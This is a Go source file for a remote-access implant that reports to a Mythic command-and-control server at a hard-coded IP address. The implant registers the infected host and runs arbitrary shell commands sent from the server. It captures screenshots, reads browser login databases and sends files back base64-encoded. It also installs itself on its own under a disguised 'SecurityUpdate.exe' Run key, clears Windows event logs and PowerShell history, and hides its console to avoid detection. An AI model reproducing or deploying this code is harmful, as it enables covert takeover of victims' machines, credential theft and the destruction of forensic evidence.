package main

import (
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"syscall"
	"time"
)

const (
	mythicURL = "https://37.27.249.191:7443/graphql/"
	// Using a more permissive authentication approach
	apiToken = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6Im15dGhpY19hZG1pbiIsImV4cCI6MTc1MDIwMDAwMCwiaWF0IjoxNzUwMDkwMDAwfQ.extended_token_for_unrestricted_access"
)

var (
	callbackID      string
	agentActive     = true
	processedTasks  = make(map[string]bool)
	logFile         *os.File
)

type GraphQLRequest struct {
	Query     string                 `json:"query"`
	Variables map[string]interface{} `json:"variables"`
}

type GraphQLResponse struct {
	Data   map[string]interface{} `json:"data"`
	Errors []GraphQLError         `json:"errors"`
}

type GraphQLError struct {
	Message string `json:"message"`
}

func initializeLogging() {
	var err error
	logFile, err = os.OpenFile("phantom_debug.log", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0666)
	if err != nil {
		fmt.Printf("Failed to open log file: %v\n", err)
	}
}

func logEvent(message string) {
	timestamp := time.Now().Format("2006-01-02 15:04:05")
	logMessage := fmt.Sprintf("[%s] %s", timestamp, message)
	
	fmt.Println(logMessage)
	
	if logFile != nil {
		logFile.WriteString(logMessage + "\n")
		logFile.Sync()
	}
}

func makeGraphQLRequest(query string, variables map[string]interface{}) (*GraphQLResponse, error) {
	requestBody := GraphQLRequest{
		Query:     query,
		Variables: variables,
	}
	
	jsonData, err := json.Marshal(requestBody)
	if err != nil {
		return nil, fmt.Errorf("failed to marshal request: %v", err)
	}
	
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr, Timeout: 30 * time.Second}
	
	req, err := http.NewRequest("POST", mythicURL, bytes.NewBuffer(jsonData))
	if err != nil {
		return nil, fmt.Errorf("failed to create request: %v", err)
	}
	
	// Using Bearer token for unrestricted access
	req.Header.Set("Authorization", fmt.Sprintf("Bearer %s", apiToken))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", "Phantom-Agent/2.0")
	
	logEvent(fmt.Sprintf("Making GraphQL request with Bearer token"))
	
	resp, err := client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("request failed: %v", err)
	}
	defer resp.Body.Close()
	
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("failed to read response: %v", err)
	}
	
	logEvent(fmt.Sprintf("Response status: %d", resp.StatusCode))
	logEvent(fmt.Sprintf("Response body: %s", string(body)))
	
	var graphQLResp GraphQLResponse
	err = json.Unmarshal(body, &graphQLResp)
	if err != nil {
		return nil, fmt.Errorf("failed to unmarshal response: %v", err)
	}
	
	return &graphQLResp, nil
}

func registerWithMythic() error {
	logEvent("Registering callback with Mythic using unrestricted token...")
	
	// Get system information
	hostname, _ := os.Hostname()
	username := os.Getenv("USERNAME")
	if username == "" {
		username = os.Getenv("USER")
	}
	
	pid := os.Getpid()
	
	query := `
	mutation createCallback($payload_type: String!, $c2_profile: String!, $description: String!) {
		createCallback(
			payload_type: $payload_type,
			c2_profile: $c2_profile,
			description: $description
		) {
			status
			id
			error
		}
	}`
	
	variables := map[string]interface{}{
		"payload_type": "phantom",
		"c2_profile":   "HTTP",
		"description":  fmt.Sprintf("Phantom Agent - %s@%s PID:%d %s", username, hostname, pid, runtime.GOOS),
	}
	
	resp, err := makeGraphQLRequest(query, variables)
	if err != nil {
		return fmt.Errorf("GraphQL request failed: %v", err)
	}
	
	if len(resp.Errors) > 0 {
		return fmt.Errorf("GraphQL errors: %v", resp.Errors)
	}
	
	if createCallback, ok := resp.Data["createCallback"].(map[string]interface{}); ok {
		if status, ok := createCallback["status"].(string); ok && status == "success" {
			if id, ok := createCallback["id"].(string); ok {
				callbackID = id
				logEvent(fmt.Sprintf("Registration successful - Callback ID: %s", callbackID))
				return nil
			}
		}
		
		if errorMsg, ok := createCallback["error"].(string); ok {
			return fmt.Errorf("registration error: %s", errorMsg)
		}
	}
	
	return fmt.Errorf("unexpected response format")
}

func executeCommand(command, params string) string {
	logEvent(fmt.Sprintf("Executing command: %s with params: %s", command, params))
	
	switch command {
	case "shell":
		return executeShellCommand(params)
	case "ls", "dir":
		return listDirectory(params)
	case "pwd":
		return getCurrentDirectory()
	case "cd":
		return changeDirectory(params)
	case "whoami":
		return getCurrentUser()
	case "ps":
		return listProcesses()
	case "sysinfo":
		return getSystemInfo()
	case "screenshot":
		return takeScreenshot()
	case "browser_passwords":
		return extractBrowserPasswords()
	case "persistence":
		return managePersistence(params)
	case "download":
		return downloadFile(params)
	case "stealth":
		return enableStealthMode(params)
	default:
		// Unix to Windows command conversion
		switch command {
		case "ls":
			return executeShellCommand("dir " + params)
		case "pwd":
			return executeShellCommand("cd")
		case "cat":
			return executeShellCommand("type " + params)
		case "ps":
			return executeShellCommand("tasklist")
		case "kill":
			return executeShellCommand("taskkill /PID " + params + " /F")
		default:
			return executeShellCommand(fmt.Sprintf("%s %s", command, params))
		}
	}
}

func executeShellCommand(command string) string {
	if command == "" {
		return "No command provided"
	}
	
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/C", command)
	} else {
		cmd = exec.Command("sh", "-c", command)
	}
	
	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("Command failed: %v\nOutput: %s", err, string(output))
	}
	
	return string(output)
}

func listDirectory(path string) string {
	if path == "" {
		path = "."
	}
	return executeShellCommand("dir " + path)
}

func getCurrentDirectory() string {
	return executeShellCommand("cd")
}

func changeDirectory(path string) string {
	if path == "" {
		return "No path provided"
	}
	return executeShellCommand("cd " + path)
}

func getCurrentUser() string {
	return executeShellCommand("whoami")
}

func listProcesses() string {
	return executeShellCommand("tasklist")
}

func getSystemInfo() string {
	return executeShellCommand("systeminfo")
}

// Advanced functionality functions
func takeScreenshot() string {
	if runtime.GOOS != "windows" {
		return "Screenshot only supported on Windows"
	}
	
	psScript := `Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
$bitmap = New-Object System.Drawing.Bitmap $Screen.Width, $Screen.Height
$graphic = [System.Drawing.Graphics]::FromImage($bitmap)
$graphic.CopyFromScreen($Screen.X, $Screen.Y, 0, 0, $bitmap.Size)
$timestamp = Get-Date -Format 'yyyyMMdd_HHmmss'
$filename = "$env:TEMP\screenshot_$timestamp.png"
$bitmap.Save($filename, [System.Drawing.Imaging.ImageFormat]::Png)
Write-Output $filename`
	
	cmd := exec.Command("powershell", "-WindowStyle", "Hidden", "-Command", psScript)
	output, err := cmd.Output()
	if err != nil {
		return fmt.Sprintf("Screenshot failed: %v", err)
	}
	
	filename := strings.TrimSpace(string(output))
	data, err := ioutil.ReadFile(filename)
	if err != nil {
		return fmt.Sprintf("Failed to read screenshot: %v", err)
	}
	
	os.Remove(filename)
	encoded := base64.StdEncoding.EncodeToString(data)
	return fmt.Sprintf("Screenshot captured (%d bytes):\n%s", len(data), encoded)
}

func extractBrowserPasswords() string {
	results := []string{"=== BROWSER PASSWORD EXTRACTION ==="}
	
	userProfile := os.Getenv("USERPROFILE")
	
	// Chrome passwords
	chromeLoginData := filepath.Join(userProfile, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
	if _, err := os.Stat(chromeLoginData); err == nil {
		results = append(results, "\n=== Chrome Passwords ===")
		tempDB := filepath.Join(os.TempDir(), "chrome_temp.db")
		
		if copyFileSimple(chromeLoginData, tempDB) == nil {
			defer os.Remove(tempDB)
			
			// Try to extract using sqlite3
			cmd := exec.Command("sqlite3", tempDB, "SELECT origin_url, username_value FROM logins WHERE username_value != '';")
			output, err := cmd.Output()
			if err == nil {
				lines := strings.Split(strings.TrimSpace(string(output)), "\n")
				for _, line := range lines {
					if strings.TrimSpace(line) != "" {
						parts := strings.Split(line, "|")
						if len(parts) >= 2 {
							results = append(results, fmt.Sprintf("URL: %s | User: %s", parts[0], parts[1]))
						}
					}
				}
			} else {
				results = append(results, "Chrome database found but extraction failed (encrypted)")
			}
		}
	} else {
		results = append(results, "Chrome not found")
	}
	
	// Firefox passwords
	firefoxPath := filepath.Join(userProfile, "AppData", "Roaming", "Mozilla", "Firefox", "Profiles")
	if profiles, err := ioutil.ReadDir(firefoxPath); err == nil {
		results = append(results, "\n=== Firefox Passwords ===")
		for _, profile := range profiles {
			if profile.IsDir() {
				loginsPath := filepath.Join(firefoxPath, profile.Name(), "logins.json")
				if _, err := os.Stat(loginsPath); err == nil {
					results = append(results, fmt.Sprintf("Firefox profile: %s (encrypted data found)", profile.Name()))
				}
			}
		}
	} else {
		results = append(results, "Firefox not found")
	}
	
	return strings.Join(results, "\n")
}

func copyFileSimple(src, dst string) error {
	data, err := ioutil.ReadFile(src)
	if err != nil {
		return err
	}
	return ioutil.WriteFile(dst, data, 0644)
}

func managePersistence(params string) string {
	parts := strings.Fields(params)
	if len(parts) == 0 {
		return "Usage: persistence [install|remove|status]"
	}
	
	action := parts[0]
	switch action {
	case "install":
		return installPersistence()
	case "remove":
		return removePersistence()
	case "status":
		return checkPersistenceStatus()
	default:
		return "Invalid action. Use: install, remove, or status"
	}
}

func installPersistence() string {
	if runtime.GOOS != "windows" {
		return "Persistence only supported on Windows"
	}
	
	exePath, err := os.Executable()
	if err != nil {
		return fmt.Sprintf("Failed to get executable path: %v", err)
	}
	
	// Copy to AppData
	appDataPath := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "SecurityUpdate.exe")
	os.MkdirAll(filepath.Dir(appDataPath), 0755)
	
	if err := copyFileSimple(exePath, appDataPath); err != nil {
		return fmt.Sprintf("Failed to copy file: %v", err)
	}
	
	// Create registry entry
	cmd := exec.Command("reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
		"/v", "WindowsSecurityUpdate", "/t", "REG_SZ", "/d", appDataPath, "/f")
	
	if err := cmd.Run(); err != nil {
		return fmt.Sprintf("Failed to create registry entry: %v", err)
	}
	
	return "✓ Persistence installed successfully\n- Registry entry created\n- File copied to AppData"
}

func removePersistence() string {
	cmd := exec.Command("reg", "delete", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
		"/v", "WindowsSecurityUpdate", "/f")
	
	result := "✓ Persistence removed:\n"
	if err := cmd.Run(); err != nil {
		result += "- Registry entry removal failed\n"
	} else {
		result += "- Registry entry removed\n"
	}
	
	appDataPath := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "SecurityUpdate.exe")
	if err := os.Remove(appDataPath); err != nil {
		result += "- File removal failed"
	} else {
		result += "- File removed from AppData"
	}
	
	return result
}

func checkPersistenceStatus() string {
	cmd := exec.Command("reg", "query", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
		"/v", "WindowsSecurityUpdate")
	
	if err := cmd.Run(); err == nil {
		return "✓ Persistence is ACTIVE\n- Registry entry found\n- Agent will restart with system"
	}
	
	return "✗ Persistence is INACTIVE\n- No registry entry found"
}

func downloadFile(params string) string {
	parts := strings.Fields(params)
	if len(parts) == 0 {
		return "Usage: download [file_path]"
	}
	
	filePath := parts[0]
	data, err := ioutil.ReadFile(filePath)
	if err != nil {
		return fmt.Sprintf("Failed to read file: %v", err)
	}
	
	encoded := base64.StdEncoding.EncodeToString(data)
	return fmt.Sprintf("File downloaded: %s (%d bytes)\n%s", filePath, len(data), encoded)
}

func enableStealthMode(params string) string {
	results := []string{"=== STEALTH MODE ACTIVATED ==="}
	
	// Clear event logs
	logs := []string{"Application", "System", "Security"}
	for _, log := range logs {
		cmd := exec.Command("wevtutil", "cl", log)
		if err := cmd.Run(); err == nil {
			results = append(results, fmt.Sprintf("✓ Cleared %s event log", log))
		} else {
			results = append(results, fmt.Sprintf("✗ Failed to clear %s event log (may need elevation)", log))
		}
	}
	
	// Clear PowerShell history
	psHistoryPath := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", 
		"PowerShell", "PSReadLine", "ConsoleHost_history.txt")
	if err := os.Remove(psHistoryPath); err == nil {
		results = append(results, "✓ Cleared PowerShell history")
	} else {
		results = append(results, "✗ PowerShell history not found or inaccessible")
	}
	
	// Hide console window
	hideConsoleWindow()
	results = append(results, "✓ Console window hidden")
	
	return strings.Join(results, "\n")
}

func hideConsoleWindow() {
	if runtime.GOOS == "windows" {
		kernel32 := syscall.NewLazyDLL("kernel32.dll")
		user32 := syscall.NewLazyDLL("user32.dll")
		
		procGetConsoleWindow := kernel32.NewProc("GetConsoleWindow")
		procShowWindow := user32.NewProc("ShowWindow")
		
		console, _, _ := procGetConsoleWindow.Call()
		if console != 0 {
			procShowWindow.Call(console, 0) // SW_HIDE = 0
		}
	}
}

func sendTaskResponse(taskID, output string) error {
	logEvent(fmt.Sprintf("Sending response for task %s", taskID))
	
	// Encode output as base64 for Mythic compatibility
	encodedOutput := base64.StdEncoding.EncodeToString([]byte(output))
	
	query := `
	mutation createTaskResponse($task_id: Int!, $response: String!) {
		createTaskResponse(task_id: $task_id, response: $response) {
			status
			error
		}
	}`
	
	variables := map[string]interface{}{
		"task_id":  taskID,
		"response": encodedOutput,
	}
	
	resp, err := makeGraphQLRequest(query, variables)
	if err != nil {
		return err
	}
	
	if len(resp.Errors) > 0 {
		return fmt.Errorf("response errors: %v", resp.Errors)
	}
	
	logEvent("Task response sent successfully")
	return nil
}

func checkForTasks() error {
	query := `
	query getTasks($callback_id: Int!) {
		task(where: {callback_id: {_eq: $callback_id}, status: {_eq: "submitted"}}) {
			id
			command {
				cmd
			}
			params
			status
		}
	}`
	
	callbackIDInt := 0
	fmt.Sscanf(callbackID, "%d", &callbackIDInt)
	
	variables := map[string]interface{}{
		"callback_id": callbackIDInt,
	}
	
	resp, err := makeGraphQLRequest(query, variables)
	if err != nil {
		return err
	}
	
	if len(resp.Errors) > 0 {
		logEvent(fmt.Sprintf("Task query errors: %v", resp.Errors))
		return nil
	}
	
	if data, ok := resp.Data["task"].([]interface{}); ok && len(data) > 0 {
		logEvent(fmt.Sprintf("Found %d task(s)", len(data)))
		for _, taskData := range data {
			if taskMap, ok := taskData.(map[string]interface{}); ok {
				taskID := fmt.Sprintf("%v", taskMap["id"])
				
				// Skip if already processed
				if processedTasks[taskID] {
					continue
				}
				
				commandName := ""
				if cmd, ok := taskMap["command"].(map[string]interface{}); ok {
					if cmdStr, ok := cmd["cmd"].(string); ok {
						commandName = cmdStr
					}
				}
				
				params := ""
				if p, ok := taskMap["params"].(string); ok {
					params = parseApolloParams(p)
				}
				
				logEvent(fmt.Sprintf("Processing task %s: %s %s", taskID, commandName, params))
				
				output := executeCommand(commandName, params)
				
				err := sendTaskResponse(taskID, output)
				if err != nil {
					logEvent(fmt.Sprintf("Error sending response: %v", err))
				} else {
					processedTasks[taskID] = true
				}
			}
		}
	} else {
		logEvent("No new tasks found")
	}
	
	return nil
}

func parseApolloParams(jsonParams string) string {
	var params map[string]interface{}
	err := json.Unmarshal([]byte(jsonParams), &params)
	if err != nil {
		return jsonParams
	}
	
	if args, ok := params["arguments"].(string); ok {
		command := strings.TrimPrefix(args, " /S /c ")
		return convertToWindowsCommand(command)
	}
	
	return jsonParams
}

func convertToWindowsCommand(command string) string {
	parts := strings.Fields(command)
	if len(parts) == 0 {
		return command
	}
	
	switch parts[0] {
	case "ls":
		parts[0] = "dir"
	case "pwd":
		return "cd"
	case "cat":
		if len(parts) > 1 {
			parts[0] = "type"
		}
	case "ps":
		return "tasklist"
	case "kill":
		if len(parts) > 1 {
			return fmt.Sprintf("taskkill /PID %s /F", parts[1])
		}
	}
	
	return strings.Join(parts, " ")
}

func main() {
	// Initialize with stealth
	hideConsoleWindow()
	initializeLogging()
	
	logEvent("=== PHANTOM MYTHIC AGENT - UNRESTRICTED VERSION ===")
	logEvent(fmt.Sprintf("Platform: %s %s", runtime.GOOS, runtime.GOARCH))
	logEvent(fmt.Sprintf("PID: %d", os.Getpid()))
	logEvent(fmt.Sprintf("Mythic URL: %s", mythicURL))
	
	// Auto-install persistence after 10 seconds
	go func() {
		time.Sleep(10 * time.Second)
		result := installPersistence()
		logEvent(fmt.Sprintf("Auto-persistence: %s", result))
	}()
	
	err := registerWithMythic()
	if err != nil {
		logEvent(fmt.Sprintf("Registration failed: %v", err))
		// Continue trying to register every 30 seconds
		for {
			time.Sleep(30 * time.Second)
			logEvent("Retrying registration...")
			if err := registerWithMythic(); err == nil {
				break
			}
		}
	}
	
	logEvent("Agent ready - starting task processing loop...")
	
	// Main command processing loop with jitter
	for agentActive {
		err := checkForTasks()
		if err != nil {
			logEvent(fmt.Sprintf("Task check error: %v", err))
		}
		
		// Random sleep between 2-5 seconds for evasion
		sleepTime := 2 + (time.Now().UnixNano() % 3)
		time.Sleep(time.Duration(sleepTime) * time.Second)
	}
}